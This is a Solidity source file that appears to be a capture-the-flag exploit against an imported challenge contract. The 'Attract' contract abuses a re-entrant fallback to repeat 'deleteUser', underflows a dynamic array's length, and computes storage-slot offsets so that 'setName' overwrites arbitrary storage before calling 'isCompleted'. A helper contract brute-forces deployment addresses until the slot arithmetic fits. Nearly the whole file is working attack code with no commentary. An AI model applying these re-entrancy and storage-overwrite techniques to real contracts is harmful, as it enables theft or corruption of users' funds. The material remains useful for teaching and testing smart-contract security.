// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;
import "./1.sol";
contract Attract{
    check check1;
    userinfo user1;
    uint256 times;
    constructor(check addr)  public{
        check1 = addr;
        user1 = check1.info();
    }
    function getArrayIndex(address addr) public view returns(uint256){
        return uint256(keccak256(abi.encodePacked(uint256(uint160(addr)),uint256(2))));
    }
    function getUserIndex(address addr) public view returns(uint256){
        return uint256(keccak256(abi.encodePacked(getArrayIndex(addr))));
    }
    function getUserOverAddress(address addr) public view returns(uint256){
        return (2**256 - 1 - uint256(getUserIndex(addr)) + 1) % 2;
    }
    function getUserOverIndex(address addr)public view returns(uint256){
        return (2**256 - 1 - uint256(getUserIndex(addr)) + 1) / 2 ;
    }
    function getMappingIndex(address addr) public view returns(uint256){
        return uint256(keccak256(abi.encodePacked(uint256(uint160(addr)),uint256(1))));
    }
    function getMappingOverAddress(address addr) public view returns(uint256){
        return (uint256(getMappingIndex(addr) - uint256(getUserIndex(addr)))) % 2;
    }
    function getMappingOverIndex(address addr) public view returns(uint256){
        return (uint256(getMappingIndex(addr) - uint256(getUserIndex(addr)))) / 2;
    }

    function attract() public {
        user1.addUser.value(msg.value)("a");
        user1.deleteUser();
        user1.setName(getUserOverIndex(address(this)),"");
        user1.setName(getMappingOverIndex(address(this)),"I am comming");
        check1.isCompleted();
    }
    function() payable external {
        if(times<2){
            times+=1;
            user1.deleteUser();
        }
    }
}
contract GatAddress{
    Attract public orderaddress;
    function getArrayIndex(address addr) public view returns(uint256){
        return uint256(keccak256(abi.encodePacked(uint256(uint160(addr)),uint256(2))));
    }
    function getUserIndex(address addr) public view returns(uint256){
        return uint256(keccak256(abi.encodePacked(getArrayIndex(addr))));
    }
    function getUserOverAddress(address addr) public view returns(uint256){
        return (2**256 - 1 - uint256(getUserIndex(addr))+1) % 2;
    }
    function getUserOverIndex(address addr)public view returns(uint256){
        return (2**256 - 1 - uint256(getUserIndex(addr)) + 1) / 2 ;
    }
    function getMappingIndex(address addr) public view returns(uint256){
        return uint256(keccak256(abi.encodePacked(uint256(uint160(addr)),uint256(1))));
    }
    function getMappingOverAddress(address addr) public view returns(uint256){
        return (uint256(getMappingIndex(addr) - uint256(getUserIndex(addr)))) % 2;
    }
    function getMappingOverIndex(address addr) public view returns(uint256){
        return (uint256(getMappingIndex(addr) - uint256(getUserIndex(addr)))) / 2;
    }
    function getaddress(check addr) public {
        for(uint256 i = 0 ; i <= 999 ;i++){
            Attract a = new Attract(addr);
            if (getMappingOverAddress(address(a)) ==0 && getUserOverAddress(address(a)) ==0){
                orderaddress = a;
                break ;
            }
        }
    }
}